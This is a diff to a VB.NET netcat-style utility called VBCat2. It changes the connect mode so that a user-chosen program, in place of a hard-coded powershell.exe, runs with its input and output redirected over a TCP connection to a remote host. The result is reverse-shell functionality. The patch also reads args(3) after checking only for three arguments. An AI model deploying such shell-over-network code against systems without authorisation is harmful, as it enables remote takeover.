@@ -12,8 +12,8 @@ Public Class VBCat2
         If args.Length = 0 Then
             Console.WriteLine("Usage: VBCat2.exe <mode> [options]")
             Console.WriteLine("Modes:")
-            Console.WriteLine("  -c <hostname> <port>    Connect to a remote host")
-            Console.WriteLine("  -l <port>               Listen for incoming connections")
+            Console.WriteLine("  -c <hostname> <port> <program>   Connect to a remote host")
+            Console.WriteLine("  -l <port>                        Listen for incoming connections")
             Return
         End If
 
@@ -22,14 +22,15 @@ Public Class VBCat2
         Select Case mode
             Case "-c"
                 If args.Length < 3 Then
-                    Console.WriteLine("Usage: VBCat2.exe -c <hostname> <port>")
+                    Console.WriteLine("Usage: VBCat2.exe -c <hostname> <port> <program>")
                     Return
                 End If
 
                 Dim remoteHost As String = args(1)
                 Dim remotePort As Integer
+                Dim program As String = args(3)
                 If Integer.TryParse(args(2), remotePort) Then
-                    vbCat2.ConnectToRemoteHost(remoteHost, remotePort, mode).Wait()
+                    vbCat2.ConnectToRemoteHost(remoteHost, remotePort, mode, program).Wait()
                 ElseIf remotePort = 0 Then
                     Console.WriteLine("Invalid port number. Exiting...")
                 ElseIf remotePort < 0 Then
@@ -61,7 +62,7 @@ Public Class VBCat2
     End Sub
 
     ' Function to connect to a remote host
-    Function ConnectToRemoteHost(ByVal remoteHost As String, ByVal remotePort As Integer, ByVal mode As String) As Task
+    Function ConnectToRemoteHost(ByVal remoteHost As String, ByVal remotePort As Integer, ByVal mode As String, ByVal program As String) As Task
         Try
             ' Connect to the remote server
             Dim client As New TcpClient(remoteHost, remotePort)
@@ -72,7 +73,7 @@ Public Class VBCat2
 
             ' Set up the input and output streams for the CLI program
             Dim cliProcess As New Process()
-            cliProcess.StartInfo.FileName = "powershell.exe"
+            cliProcess.StartInfo.FileName = program
             cliProcess.StartInfo.UseShellExecute = False
             cliProcess.StartInfo.RedirectStandardInput = True
             cliProcess.StartInfo.RedirectStandardOutput = True
